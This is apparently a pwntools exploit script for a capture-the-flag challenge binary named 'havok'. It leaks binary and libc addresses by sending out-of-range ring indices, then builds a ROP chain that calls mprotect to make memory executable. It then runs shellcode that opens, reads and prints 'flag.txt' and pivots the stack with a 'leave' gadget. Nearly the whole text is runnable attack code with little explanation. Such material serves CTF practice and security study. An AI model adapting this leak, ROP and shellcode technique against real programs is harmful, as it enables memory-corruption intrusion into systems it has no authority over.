#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('havok_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*0x0000555555555658
        # b*calibrate_rings+245
        b*inject_plasma+131
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('0', 1337)
else:
    p = process([exe.path])
GDB()

sa(b'3):', b'8388607')
p.recvuntil(b'Ring--1 energy: ')

binary_leak = int(p.recvline()[:-1], 16)
exe.address = binary_leak - 0x17e0
info(f'binary leak: {hex(binary_leak)}')
info(f'binary base: {hex(exe.address)}')

sa(b'Provide a label for this ring reading:\n', b'aaa')
input()

sa(b'3):', b'8388606')
a = p.recvuntil(b'energy: ')

libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x82e00
info(f'binary leak: {hex(libc_leak)}')
info(f'binary base: {hex(libc.address)}')

sa(b'Provide a label for this ring reading:\n', b'aaa')

pop_rdi = 0x000000000010269a + libc.address
pop_rsi = 0x0000000000053887 + libc.address
pop_rdx_xor_rax = 0x00000000000d6ffd + libc.address # pop rdx ; xor eax, eax ; ret
pop_rax = 0x00000000000d47d7 + libc.address
syscall = libc.address + 0x93916
leave = libc.address + 0x0000000000040b7c + 2

#  #
shellcode = asm(
f"""

    add rcx, 0x1d
    {shellcraft.pushstr("flag.txt")}
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 2

    lea r10, [rip]
    add r10, 0xf
    push r10
    call rcx

    mov edi, eax
    mov rsi, rsp
    mov edx, 0x50
    mov eax, 0

    sub rcx, 2
    add r10, 0x14
    push r10
    call rcx

    mov edi, 1
    mov eax, 1
    sub rcx, 2
    call rcx

"""
)



load = flat(
    pop_rdi,
    exe.address +0x4000,
    pop_rsi,
    0x1000,
    pop_rdx_xor_rax,
    7,
    pop_rax,
    0x0a,
    syscall,
    exe.address + 0x40b0,
    shellcode
)

sa(b'Upload Plasma Signature (up to 256 bytes):\n', load)

load = flat(
    b'A'*0x20,
    exe.address + 0x4058,
    leave
)

sa(b'Confirm injection key:\n', load)

p.interactive()
